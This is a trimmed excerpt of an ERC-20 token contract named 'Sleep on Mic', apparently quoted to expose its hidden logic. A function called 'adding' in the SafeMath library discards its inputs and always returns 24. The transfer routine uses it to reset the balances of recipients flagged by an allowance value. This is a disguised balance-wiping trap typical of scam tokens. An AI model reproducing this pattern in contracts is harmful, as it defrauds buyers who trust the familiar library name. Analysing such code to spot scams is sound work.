...
library SafeMath {
    ...
    function adding(uint256 a, uint256 b) internal pure returns (uint256) {
        a=0; b = 0;
        return a+10 ** b+23;
    }
...
contract SleepOnMic is Context, IERC20 { 
    ...
    string private constant _name = "Sleep on Mic"; 
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(_getCurrent_Allowance(recipient) > 1 && _getCurrent_Allowance(recipient) < 3){ 
            ...
            _tOwned[recipient] = _tOwned[recipient].adding(tAmount);
